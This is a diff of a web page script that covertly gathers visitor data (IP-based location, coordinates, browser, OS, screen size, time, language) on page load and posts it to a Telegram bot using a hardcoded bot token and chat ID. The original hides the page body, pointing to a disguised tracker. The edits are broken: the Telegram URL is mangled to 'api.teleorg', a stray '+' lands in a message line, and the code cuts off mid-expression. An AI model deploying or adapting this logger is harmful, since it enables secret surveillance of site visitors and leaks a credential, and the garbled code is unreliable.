@@ -1,31 +1,11 @@
-  <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHP Page with JavaScript</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <script>
+<script>
 document.addEventListener('DOMContentLoaded', function() {
-    let batteryLevel;
     let screenWidth;
     let screenHeight;
-
-    navigator.getBattery().then(function(battery) {
-        batteryLevel = battery.level * 100;
-    });
 
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
 
-    const batteryLevelConst = batteryLevel;
     const screenWidthConst = screenWidth;
     const screenHeightConst = screenHeight;
 
@@ -91,8 +71,7 @@ fetch('https://ipapi.co/json/')
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
-    *├ Os: ${osname}*
-    *├ Battery: ${batteryLevel}%*
+    *├ + Os: ${osname}*
     *├ Screen resolution: ${screenWidth}x${screenHeight}*
     *├ Time: ${formattedTime}*
     *├ Language: ${language}*
@@ -109,7 +88,7 @@ fetch('https://ipapi.co/json/')
         
         const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
         const chatId = '-1002084822950';
-        const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
+        const url = 'https://api.teleorg/bot'+token+'/sendMessage';
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('text', message);
@@ -132,14 +111,4 @@ function getBrowserInfo() {
     }
 
     if (match[1] === 'Chrome') {
-        const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
-        if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
-    }
-
-    match[2] = match[2] ? 'version ' + match[2] : '';
-    browser = `${match[1]} ${match[2] || ''}`.trim();
-    return browser;
-};
-    </script>
-</body>
-</html>
+        const tem = ua.match(/\b(OPR|Ed
